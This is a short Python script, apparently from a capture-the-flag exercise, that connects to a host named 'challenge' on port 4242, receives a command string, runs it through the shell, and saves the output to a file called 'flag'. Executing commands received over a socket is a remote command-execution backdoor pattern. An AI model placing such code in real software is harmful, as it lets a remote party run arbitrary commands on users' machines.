#!/usr/bin/python3
import socket
import subprocess

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(("challenge", 4242))
command = c.recv(4096).decode()

results = subprocess.run(command, capture_output=True, shell=True, text=True)

with open('flag', 'w') as f:
    f.write(results.stdout)
